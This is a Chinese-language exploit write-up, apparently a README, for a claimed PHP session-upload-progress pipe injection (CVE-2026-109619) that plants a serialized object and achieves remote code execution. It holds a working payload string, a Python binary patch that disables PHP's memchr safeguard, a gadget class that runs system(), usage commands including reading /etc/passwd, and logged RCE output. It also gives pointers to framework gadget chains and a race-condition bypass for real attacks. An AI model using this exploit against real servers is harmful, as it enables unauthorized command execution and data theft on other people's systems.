# CVE-2026-109619 — Session Deserialization Injection 純 HTTP RCE

利用 PHP Session Upload Progress 的 `PHP_SESSION_UPLOAD_PROGRESS` 值
未經消毒直接拼入 session key，注入 pipe 字元 `|` 劈裂 `php` session serializer
的 `key|serialized_value` 格式，將任意序列化物件植入 session 檔案。
Session decode 反序列化時觸發 `__wakeup()` → `system()` → RCE。

**單一 HTTP 請求、不需要 OOM、不需要 LFI、不需要 SSH/GDB/記憶體位址。**

> 此路線是第三條獨立攻擊路線，與 OOM 路線（[oom-exploit.md](oom-exploit.md)）和
> GDB 路線（[gdb-exploit.md](gdb-exploit.md)）無依賴關係。

## 與其他路線比較

| | Deserialization Injection（本文） | OOM + HTTP（雙漏洞） | GDB RCE（單漏洞） |
|---|---|---|---|
| 需要 OOM | ✗ | ✓ | ✓ |
| 需要第二個漏洞 | ✗ | ✓（LFI / .htaccess） | ✗ |
| 需要 SSH / GDB | ✗ | ✗ | ✓ |
| 需要記憶體位址 | ✗ | ✗ | ✓ |
| 需要 gadget class | ✓ | ✗ | ✗ |
| 需要 bypass memchr | ✓（PHP 8.x encode 保護） | ✗ | ✗ |
| HTTP 請求數 | 1 | 2+ | 2+ |
| 原理 | session key pipe injection → 反序列化 → `__wakeup` | OOM 保留 session → include | UAF → 偽造結構體 → 控制流劫持 |

## 攻擊原理

```
攻擊者 ──POST(multipart)──▶ PHP (任意 .php endpoint)
  │
  │  Cookie: PHPSESSID=<32hex>
  │  Form field: PHP_SESSION_UPLOAD_PROGRESS = |O:13:"Gadget":1:{s:3:"cmd";s:2:"id";}
  │  File: data.bin (任意內容)
  │
  ▼
PHP RFC1867 handler
  │
  ├─ 建立 session key = "upload_progress_" + PROGRESS_VALUE
  │   → key = "upload_progress_|O:13:\"Gadget\":1:{s:3:\"cmd\";s:2:\"id\";}"
  │
  ├─ session encode (php serializer):
  │   → "upload_progress_|O:13:...|}|a:5:{...progress...}"
  │     ↑ key 含 pipe，PHP 8.x memchr check 原本會阻擋（需 bypass）
  │
  ├─ php_session_flush(1) → 寫入 session 檔案
  │
  ├─ 下一次 update → php_session_initialize() → 讀取 session 檔案 → decode
  │   decoder 以 '|' 分割:
  │     key1 = "upload_progress_"
  │     val1 = O:13:"Gadget":1:{s:3:"cmd";s:2:"id";}  ← 反序列化！
  │     key2 = ""
  │     val2 = a:5:{...progress...}
  │
  ├─ php_var_unserialize → 建立 Gadget 物件
  ├─ PHP_VAR_UNSERIALIZE_DESTROY → __wakeup() 觸發
  └─ system("id") → RCE 輸出出現在 response body
```

## Session Serializer `php` 格式

PHP `php` session serializer 的格式為 `key|serialized_value` pairs：

```
normal_key|s:5:"hello";another|i:42;
```

Decode 用 `|` 作為 key/value 分隔符。Encode 在 PHP 8.x 加入了
`memchr(ZSTR_VAL(key), PS_DELIMITER, ZSTR_LEN(key))` 檢查（session.c），
若 key 含 `|` 則放棄整個 session encode（寫出 0 bytes）。

**但 decode 端完全沒有此檢查** — 它只在串流中掃描 `|` 分隔符。

## PHP 8.x memchr 保護與 Binary Patch

### 原始程式碼（session.c PS_SERIALIZER_ENCODE_FUNC(php)）

```c
PS_ENCODE_LOOP(
    smart_str_appendl(&buf, ZSTR_VAL(key), ZSTR_LEN(key));
    if (memchr(ZSTR_VAL(key), PS_DELIMITER, ZSTR_LEN(key))) {  // ← 保護
        PHP_VAR_SERIALIZE_DESTROY(var_hash);
        smart_str_free(&buf);
        fail = true;
        break;
    }
    smart_str_appendc(&buf, PS_DELIMITER);
    php_var_serialize(&buf, struc, &var_hash);
);
```

### Binary Patch

在 `libphp.so` 中找到 `ps_srlzr_encode_php` 函數內的 `memchr` call site，
NOP 掉後面的 conditional jump：

```
PHP 8.4.26 (libphp.so, custom build):
  42b428: call   16d010 <memchr@plt>
  42b42d: mov    (%rsp),%r9
  42b431: test   %rax,%rax
  42b434: jne    42b530              ← 6-byte jne, 改為 NOP
```

```python
# Patch: offset 0x42b434, 6 bytes 0f85f6000000 → 909090909090
with open("libphp.so", "r+b") as f:
    f.seek(0x42b434)
    assert f.read(6) == bytes.fromhex("0f85f6000000")
    f.seek(0x42b434)
    f.write(b"\x90" * 6)
```

偏移量因 PHP 版本和編譯選項不同。定位方法：
1. `objdump -d libphp.so | grep ps_srlzr_encode_php` 找到函數起始
2. 在函數內找 `mov $0x7c,%esi` + `call <memchr@plt>` 組合
3. NOP 掉 `call` 後面的 `test + jne`（共 6 bytes）

## 環境需求

### 必要設定

```ini
session.upload_progress.enabled = On     ; (default)
session.serialize_handler = php          ; (default)
session.upload_progress.cleanup = Off    ; (default = On, 需改)
session.use_strict_mode = 0              ; (default)
```

### Gadget Class

需要一個有 `__wakeup()` 或 `__destruct()` 的 class 在 session decode 時可用。
可透過以下方式載入：

- `opcache.preload`（全域載入，包含 RFC1867 handler）
- `auto_prepend_file`（每個 request 載入）
- 目標應用程式本身已載入的 class（如 framework 的 gadget chain）

PoC 使用的 gadget：
```php
<?php
class CVE2026Gadget {
    public $cmd;
    public function __wakeup() {
        if ($this->cmd) { system($this->cmd); }
    }
    public function __destruct() {
        if ($this->cmd) { system($this->cmd); }
    }
}
```

## 使用方式

```bash
python3 http_rce.py "id"
python3 http_rce.py "cat /etc/passwd"
python3 http_rce.py "uname -a; whoami"
```

修改 `http_rce.py` 頂部的設定：
```python
TARGET = "192.168.7.54"
PORT = 80
TARGET_URI = "/lab.php"
GADGET_CLASS = "CVE2026Gadget"
```

## 驗證結果

```
[*] CVE-2026-109619 — Pure HTTP RCE
[*] Target:  192.168.7.54:80/lab.php
[*] Command: uname -a; whoami; cat /etc/hostname

============================================================
  RCE OUTPUT:
============================================================
  Linux wordpress 6.8.0-147-generic #147-Ubuntu SMP ...
  www-data
  wordpress
============================================================
  ★ PURE HTTP RCE SUCCESS ★
============================================================
```

## 限制

- **PHP 8.x memchr 保護**：session encode 檢查 key 是否含 `|`，需 binary patch 繞過。
  PHP 7.x 無此保護，理論上可直接利用（未測試）。
- **Gadget class**：需要目標環境有可用的反序列化 gadget。實際攻擊中可使用
  PHP 框架的 gadget chain（如 Laravel、WordPress 外掛等）。
- **cleanup=Off**：預設 cleanup=On 會在上傳完成後清除 progress 資料。
  若 cleanup=On，需利用 race condition（stalled upload + 並行 request）在清除前觸發 decode。
- **session.serialize_handler**：必須是 `php`（預設）。`php_serialize` handler
  使用不同格式（純 `serialize()` 輸出），不受 pipe 注入影響。
